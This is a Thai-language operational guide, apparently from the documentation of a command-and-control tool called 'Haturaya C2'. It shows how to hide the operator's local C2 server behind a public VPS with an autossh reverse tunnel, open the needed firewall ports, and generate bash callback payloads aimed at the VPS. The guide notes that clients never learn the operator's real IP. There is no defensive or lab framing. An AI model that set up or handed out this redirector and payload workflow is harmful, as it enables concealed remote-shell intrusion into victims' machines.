# การเชื่อม VPS (Public IP) กับเครื่อง Local ผ่าน Reverse SSH Tunnel

ทำให้ agent เชื่อมต่อผ่าน public IP ของ VPS ได้ โดยไม่ต้องรู้จัก local IP ของเครื่องที่รัน Haturaya C2 (เครื่อง local อยู่หลัง NAT/ไม่มี public IP ก็ใช้ได้)

## แนวคิด

เครื่อง local เป็นฝ่ายเชื่อมต่อออก (outbound) ไปหา VPS ก่อนเสมอ แล้วขอให้ VPS เปิดพอร์ตไว้รอรับ connection จากภายนอก และ forward กลับเข้ามาใน tunnel นั้น

```
Client/Agent --> VPS (public IP:9999) --> [reverse tunnel] --> เครื่อง Local:9999 (Haturaya C2)
```

## ข้อกำหนดเบื้องต้น

- VPS ที่มี public IP และ SSH server (มีอยู่แล้วโดยปกติ)
- สิทธิ์ `sudo` บน VPS เพื่อแก้ config SSH และ firewall
- เครื่อง local ต้อง SSH ออกไปหา VPS ได้ (เช่นมี user account บน VPS)

## ขั้นตอนที่ 1 — ตั้งค่าบน VPS

เปิดการตั้งค่า `GatewayPorts` เพื่อให้พอร์ตที่ forward เข้ามารับ connection จากภายนอกได้ (ไม่ใช่แค่จาก localhost):

```bash
sudo sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd
```

เปิด firewall ให้พอร์ตที่ Haturaya C2 ใช้งาน (ปรับเลขพอร์ตตามที่ระบุตอนรัน):

```bash
sudo ufw allow 9999/tcp   # C2 port
sudo ufw allow 9090/tcp   # web server port
```

## ขั้นตอนที่ 2 — ตั้งค่าบนเครื่อง Local

ติดตั้ง `autossh` (คงการเชื่อมต่อให้อัตโนมัติเมื่อหลุด):

```bash
# macOS
brew install autossh

# Debian/Ubuntu
sudo apt install autossh
```

เปิด reverse tunnel ไปหา VPS:

```bash
autossh -M 0 -N \
  -R 0.0.0.0:9999:localhost:9999 \
  -R 0.0.0.0:9090:localhost:9090 \
  user@<VPS_PUBLIC_IP>
```

รันทิ้งไว้เป็น background process หรือ `screen`/`tmux` session ระหว่างที่ใช้งาน Haturaya C2

## ขั้นตอนที่ 3 — รัน Haturaya C2 และ Generate Payload

รัน Haturaya C2 ตามปกติบนเครื่อง local:

```bash
./haturaya-c2 0.0.0.0 9999 9090
```

จากนั้น generate payload โดยใช้ **public IP ของ VPS** แทน local IP:

```
generate payloads lhost=<VPS_PUBLIC_IP> lport=9999 shell=bash
```

Agent ที่รัน payload นี้จะเชื่อมต่อไปที่ VPS ซึ่งจะ forward กลับมาเครื่อง local โดยอัตโนมัติ — client ไม่มีทางรู้ local IP เบื้องหลังเลย

## Troubleshooting

| ปัญหา | สาเหตุที่เป็นไปได้ |
|---|---|
| connection refused จาก client | firewall บน VPS ยังไม่เปิดพอร์ต หรือ `GatewayPorts` ยังไม่ enable |
| tunnel หลุดบ่อย | ใช้ `ssh` เฉยๆ แทน `autossh` — เปลี่ยนมาใช้ `autossh` |
| VPS forward ไม่ถึง local | ตรวจว่า Haturaya C2 กำลัง listen อยู่จริงบน local port เดียวกับที่ระบุใน `-R` |
